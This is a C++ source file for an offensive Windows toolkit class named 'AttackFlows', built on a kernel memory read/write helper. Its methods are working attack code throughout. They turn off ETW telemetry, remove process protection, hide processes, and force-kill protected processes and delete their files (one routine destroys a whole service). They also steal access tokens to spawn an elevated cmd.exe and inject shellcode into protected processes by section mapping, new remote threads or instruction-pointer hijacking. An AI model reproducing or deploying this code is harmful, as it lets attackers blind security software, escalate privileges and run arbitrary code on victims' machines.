#include "KernelOps.cpp"
#include <TlHelp32.h>
#include<fstream>
#include <sstream>


class AttackFlows
{
public:
	KernelOps ko=KernelOps();
	DWORD64 ourHandleTable;
	pfnNtCreateThreadEx NtCreateThreadEx;
	AttackFlows() {

		ourHandleTable = ko.RetriveEprocessHandleTable(ko.ourProc);

		NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");

	}
	bool IsProcessRunning(int ProcessId)
	{
		bool exists = false;
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		if (Process32First(snapshot, &entry))
			while (Process32Next(snapshot, &entry))
				if (entry.th32ProcessID == ProcessId)
					exists = true;

		CloseHandle(snapshot);
		return exists;
	}
	void ToggleEtw(BOOL Enable) {
		ko.EnableDisableETW(Enable);
	}

	void ToggleProcessProtection(int pid, BOOL Enable) {
		CLIENT_ID TargetProcess;
		TargetProcess.UniqueProcess = (pid < 0) ? (HANDLE)GetCurrentProcessId() : (HANDLE)(DWORD_PTR)pid;
		ko.EnableDisableProtection(TargetProcess, Enable);
	}

	void HideAProcess(int pid) {
		CLIENT_ID TargetProcess;
		TargetProcess.UniqueProcess = (pid < 0) ? (HANDLE)GetCurrentProcessId() : (HANDLE)(DWORD_PTR)pid;
		ko.HideMyProcess(TargetProcess);
	}

	void DeleteProtectedFile(LPCWSTR filePath) {
		FILE_DISPOSITION_INFORMATION Dispostion = { TRUE };
		IO_STATUS_BLOCK IoStatusBlock;

		std::cout << "[#]Openeing READ_CONTROL handle to: " << filePath << std::endl;

		HANDLE fHandle = CreateFileW(filePath, READ_CONTROL, 0, 0, OPEN_EXISTING, 0, 0);
		if (fHandle == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to file: " << GetLastError() << std::endl;
			ExitProcess(0);
		}

		ko.ElevateHandle(ourHandleTable, (LONGLONG)fHandle);
		NTSTATUS a = NtSetInformationFile(fHandle, &IoStatusBlock, &Dispostion, sizeof(Dispostion), (FILE_INFORMATION_CLASS)13);

		std::cout << "[#]SetInformationFile Status: " << std::hex << a << std::endl;
		CloseHandle(fHandle);
	}
	//turn off critical 
	void TerminateProtectedProcess(int pid) {		
		NTSTATUS r;
		CLIENT_ID id;
		std::cout << "[#]Got PID: " <<pid<< " to Terminate" << std::endl;

		id.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
		id.UniqueThread = (PVOID)0;
		OBJECT_ATTRIBUTES oa;
		HANDLE handle = 0;
		InitObjAttr(&oa, NULL, NULL, NULL, NULL);
		std::cout << "[#]Openeing PROCESS_QUERY_LIMITED_INFORMATION handle to: " << pid << std::endl;
		NTSTATUS Op = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
		std::cout << "[#]NtOpenProcess Status: " << std::hex << Op << std::endl;
		if (handle == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to process " << std::endl;
			ExitProcess(0);
		}
		ko.ElevateHandle(ourHandleTable, (ULONGLONG)handle);
		ko.EnableDisableProtection(id, FALSE);
		std::cout << "[#]Terminating: " << pid << std::endl;
		TerminateProcess(handle, 0);
		std::cout << "[#]ILL BE BACK (-terminator)" << std::endl;

	}

	void StealTokenForNewProcess(int pidToSteal) {
		CLIENT_ID id;
		CLIENT_ID id2;
		id.UniqueProcess = (HANDLE)(DWORD_PTR)pidToSteal;
		PROCESS_INFORMATION pi = { 0 };
		STARTUPINFO si = { 0 };
		std::cout << "[#]Creating new CMD" << std::endl;
		BOOL created = CreateProcess(L"C:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);


		if (!created) {
			std::cout << "Unable to new process: " << GetLastError() << std::endl;
			ExitProcess(0);
		}
		std::cout << "[#]Stealing Token from: " << pidToSteal << " to process: " << pi.dwProcessId << std::endl;
		Sleep(1);
		id2.UniqueProcess = (HANDLE)pi.dwProcessId;
		ko.TransferToken(id, id2);
		
	}

	void StealTokenForExistingProcess(int pidToSteal, int pidToElevate) {
		std::cout << "[#]Stealing Token from: " << pidToSteal << " to process: " << pidToElevate << std::endl;
		CLIENT_ID id;
		CLIENT_ID id2;
		id.UniqueProcess = (HANDLE)(DWORD_PTR)pidToSteal;
		id2.UniqueProcess = (HANDLE)(DWORD_PTR)pidToElevate;
		ko.TransferToken(id, id2);
	}
	//dormammu 
	void DestroyPhoenixService(char* pidlist, char* fileList) {
		std::cout << "[#]Getting ready to destroy your service" << std::endl;
		std::fstream pidFile;
		std::fstream filFile;
		pidFile.open(pidlist, std::ios::in | std::ios::out | std::ios::app);
		std::cout << "[#]Opened: "<<pidlist << std::endl;

		filFile.open(fileList, std::ios::in | std::ios::out | std::ios::app);
		std::cout << "[#]Opened: " << fileList << std::endl;


		int pids[500];
		std::string files[500];
		int pidCounter = 0;
		int fileCounter = 0;
		std::string line;
		while (std::getline(pidFile, line)) {
			if (!IsProcessRunning(atoi(line.c_str()))) {
				std::cout << "[#]" << line << " does not exist, exiting..." << std::endl;
				exit(1);
			}
			pids[pidCounter] = atoi(line.c_str());
			pidCounter++;
		}
		while (std::getline(filFile, line)) {
			files[fileCounter] = line;
			fileCounter++;
		}
		for (int i = 0; i < pidCounter; i++)
		{
			
			this->TerminateProtectedProcess(pids[i]);
		}
		Sleep(100);
		for (int i = 0; i < fileCounter; i++)
		{
			std::wstring stemp = std::wstring(files[i].begin(), files[i].end());
			LPCWSTR sw = stemp.c_str();
			std::wcout << "[#]attempting to delete:" << sw << std::endl;
			this->DeleteProtectedFile(sw);
		}

	}
	//shared code for both injections
	void InjectProtectedProcessNewThread(char* ShellcodePath, int pid) {
		std::cout << "[#]Opening shellcode at: " << ShellcodePath << std::endl;

		HANDLE shellFile = CreateFileA(ShellcodePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (shellFile == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to file: " << GetLastError() << std::endl;
			ExitProcess(0);
		}
		DWORD  recepie_size = GetFileSize(shellFile, NULL);
		LPVOID heap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recepie_size);
		bool shellc;
		shellc = ReadFile(shellFile, heap, recepie_size, NULL, NULL);

		HANDLE sh;
		HANDLE th;
		NTSTATUS r;
		PVOID rb = NULL;
		PVOID lb = NULL;
		CLIENT_ID id;
		id.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
		id.UniqueThread = (PVOID)0;
		OBJECT_ATTRIBUTES oa;
		HANDLE handle = 0;
		SIZE_T s = recepie_size;
		LARGE_INTEGER sectionS = { (unsigned long)s };


		InitObjAttr(&oa, NULL, NULL, NULL, NULL);
		ko.EnableDisableProtection(id, FALSE);

		NTSTATUS Op = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
		if (handle == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to process: " << std::hex << Op << std::endl;
			ExitProcess(0);
		}
		ko.ElevateHandle(ourHandleTable, (ULONGLONG)handle);

		NtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (sh == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to Create Section: " << std::hex << Op << std::endl;
			ExitProcess(0);
		}
		NtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
		std::cout << "[#]Mapped view of our section result: " << std::hex << Op << std::endl;
		NtMapViewOfSection(sh, handle, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
		std::cout << "[#]Mapped view of target process section result: " << std::hex << Op << std::endl;

		memcpy(lb, heap, recepie_size);
		std::cout << "[#]Copied: " << recepie_size << " Bytes to " << std::hex << lb << std::endl;

		NtUnmapViewOfSection(GetCurrentProcess(), lb);
		NtClose(sh);
		std::cout << "[#]Thrad the Needle :v" << std::endl;

		Op=NtCreateThreadEx(&th, 0x1FFFFF, NULL, handle,
			rb, NULL, 0, 0, 0, 0, 0);
		if (th == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to Create Thread: " << std::hex << Op << std::endl;
			ExitProcess(0);
		}
		NtClose(th);

	}

	void InjectProtectedProcessHijackThread(char* ShellcodePath, int pid) {
		std::cout << "[#]Opening shellcode at: " << ShellcodePath << std::endl;

		HANDLE shellFile = CreateFileA(ShellcodePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (shellFile == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to file: " << GetLastError() << std::endl;
			ExitProcess(0);
		}
		DWORD  recepie_size = GetFileSize(shellFile, NULL);
		LPVOID heap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recepie_size);
		std::cout << "[#]Heap Allocation Address: " << heap << std::endl;

		bool shellc;
		shellc = ReadFile(shellFile, heap, recepie_size, NULL, NULL);
		std::cout << "[#]Read Shellcode to heap success: " << shellc << std::endl;

		HANDLE sh;
		NTSTATUS r;
		PVOID rb = NULL;
		PVOID lb = NULL;
		CLIENT_ID id;
		HANDLE threadHijacked = NULL;
		HANDLE snapshot;
		HANDLE DebugObjectHandle;
		OBJECT_ATTRIBUTES ObjectAttributes;
		InitializeObjectAttributes(&ObjectAttributes, 0, 0, 0, 0);
		THREADENTRY32 threadEntry;
		sh = NULL;
		threadEntry.dwSize = sizeof(THREADENTRY32);
		id.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
		id.UniqueThread = (PVOID)0;
		OBJECT_ATTRIBUTES oa;
		HANDLE handle = 0;
		InitObjAttr(&oa, NULL, NULL, NULL, NULL);
		SIZE_T s = recepie_size;
		LARGE_INTEGER sectionS = { (unsigned long)s };

		ko.EnableDisableProtection(id, FALSE);
		NTSTATUS Op = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
		if (handle == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to obtain a handle to file: " << std::hex<< Op << std::endl;
			ExitProcess(0);
		}
		ko.ElevateHandle(ourHandleTable, (ULONGLONG)handle);

		Op= NtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (sh == INVALID_HANDLE_VALUE) {
			std::cout << "[#]Unable to Create Section: " << std::hex << Op << std::endl;
			ExitProcess(0);
		}
		Op = NtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
		std::cout << "[#]Mapped view of our section result: " << std::hex << Op << std::endl;

		Op = NtMapViewOfSection(sh, handle, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
		std::cout << "[#]Mapped view of target process section result: " << std::hex << Op << std::endl;

		memcpy(lb, heap, recepie_size);
		std::cout << "[#]Copied: "<< recepie_size<<" Bytes to "<<std::hex<<lb << std::endl;

		Op = NtUnmapViewOfSection(GetCurrentProcess(), lb);

		Op = NtClose(sh);

		snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		Thread32First(snapshot, &threadEntry);

		while (Thread32Next(snapshot, &threadEntry))
		{

			if (threadEntry.th32OwnerProcessID == (DWORD)(DWORD_PTR)id.UniqueProcess)
			{
				DWORD hThreadId = threadEntry.th32ThreadID;
				id.UniqueThread = (HANDLE)(DWORD_PTR)threadEntry.th32ThreadID;
				threadHijacked = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadEntry.th32ThreadID);
				std::cout << "[#]Got Hijacked Thread HANDLE: " << std::hex << threadHijacked << std::endl;

				break;
			}
		}
		ko.ElevateHandle(ourHandleTable, (ULONGLONG)threadHijacked);



		NTSTATUS dbg = NtCreateDebugObject(&DebugObjectHandle, DEBUG_ALL_ACCESS, &ObjectAttributes, FALSE);
		std::cout << "[#]Created Debug HANDLE? " << std::hex << dbg << std::endl;

		DWORD64 ThreadListHead = ko.RetriveEprocessThreadList(id);
		std::cout << "[#]Got ThreadListHead at: " << std::hex << ThreadListHead << std::endl;

		DWORD64 HijackEthread = ko.LookupEThreadByCid(ThreadListHead, id);
		std::cout << "[#]Got Thread To Hijack at: " << std::hex << ThreadListHead << std::endl;

		DWORD64 TrapFrame = ko.ReadDWORD64(HijackEthread + ko.Offsets.TrapFrame);
		std::cout << "[#]Got Thread TrapFrame at: " << std::hex << TrapFrame << std::endl;

		NTSTATUS dbg2 = NtDebugActiveProcess(handle, DebugObjectHandle);
		std::cout << "[#]Put the Process into of debug? " << std::hex << dbg2 << std::endl;
		ko.WriteDWORD64(TrapFrame + ko.Offsets.Rip, (ULONGLONG)rb);
		std::cout << "[#]Over Wrote RIP to match: "  << std::hex << rb << std::endl;

		dbg2 = NtRemoveProcessDebug(handle, DebugObjectHandle);
		std::cout << "[#]Put the Process out of debug? " << std::hex << dbg2 << std::endl;
		std::cout << "[#]Hi Jack...How Are you?" << std::endl;

	}


};

